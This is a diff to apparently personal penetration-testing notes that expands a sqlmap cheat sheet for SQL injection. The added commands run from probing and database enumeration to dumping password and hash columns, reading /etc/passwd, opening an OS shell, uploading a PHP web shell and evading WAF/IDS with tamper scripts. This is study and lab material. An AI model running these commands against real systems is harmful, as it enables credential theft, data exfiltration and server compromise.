@@ -27,30 +27,42 @@ we use ', --, OR, UNION, etc... to interrupt the sql query. if not properly sani
 
 [_sqlmap_](http://sqlmap.org/) -- Look for URLs like /category.php?paramater=1   `1, 2, etc... indicate tables`
 ```bash
-# blind fire -- not ideal...
-sqlmap -u <url> --forms --crawl=2
+# 0. SOME USEFUL OPTIONS
+--batch        # dont talk to me, just do it
+--threads 10   # Use this to speed up going forward
 
-# Find injection points -- should resemble the URL below
-sqlmap -u http://192.168.50.19/category?id=1 -p <paramater> # id is paramater in this example
+# 1. INITIAL PROBE - Is it vulnerable?
+# Best Practice: Save a Burp request as 'req.txt' to preserve headers/cookies
+# intercepting login pages is a good choice. a failed one!
+sqlmap -r req.txt --batch --banner         # Basic check for DB version
+sqlmap -r req.txt --level=3 --risk=2 --dbs # Deep scan (checks Headers/Cookies)
+sqlmap -u "http://target.com/id=1" --forms --crawl=2 # Spidering 
 
-# Enumerate DBs
-sqlmap -u http://192.168.50.19/category?id=1 -p <paramater> --dbs --batch
+# 2. ENUMERATION
+sqlmap -r req.txt --current-user --current-db --is-dba # situational awareness
+sqlmap -r req.txt -D <db_name> --tables                # List tables in a DB
+sqlmap -r req.txt -D <db_name> -T <table_name> --cols  # List columns in table
 
-# Dump
-sqlmap -u http://192.168.50.19/category?id=1 -p <paramater> -D <db> --dump
+# 3. EXTRACTION
+sqlmap -r req.txt -D <db_name> -T <table_name> [-C "user,pass"] --dump
+sqlmap -r req.txt --dump-all --exclude-sysdbs        # Dump everything (Loud!)
+sqlmap -r req.txt --search -C "password,hash,email"  # Search DB for keywords
 
-# Full Shell
-Intercept POST request and save as post.txt (burp lets you do this)
-sqlmap -r post.txt -p <paramater>  --os-shell  --web-root "/var/www/html/tmp"
+# 4. SYSTEM EXPLOITATION - TRY ALL
+sqlmap -r req.txt --dbms=mysql --os-shell   # Get interactive shell
+sqlmap -r req.txt --file-read="/etc/passwd" # Read files. configs, ssh, etc
+sqlmap -r req.txt --file-write="shell.php" --file- dest="/var/www/html/tmp/sh.php"               # Upload
 
---dbs         # enumerate databases
---batch       # Default options
--D <database> # specify database
---dump        # dumps entire db
+# 5. EVASION & OPTIMIZATION
+--random-agent                            # Use a real browser User-Agent string
+--proxy=http://127.0.0.1:8080             # Route through Burp to debug payloads
+--tamper=space2comment,between,randomcase # Standard WAF/IDS bypass scripts
+--technique=BEUSTQ             # B:Boolean, E:Error, U:Union, S:Stacked, T:Time
+--threads=5                    # Speed up the dump (don't go too high)
+--flush-session                # Clear cache if results seem "stuck"
 
--r <post.txt> # reference for sqlmap to know all fields to include in POSTs
---os-shell    # full interactive shell
---web-root    # specify web root
+# 6. POST-EXPLOIT CLEANUP
+--cleanup                     # Remove UDFs and temporary tables created
 ```
 see [[2 Manual and Automated Code Execution]] for more info
 
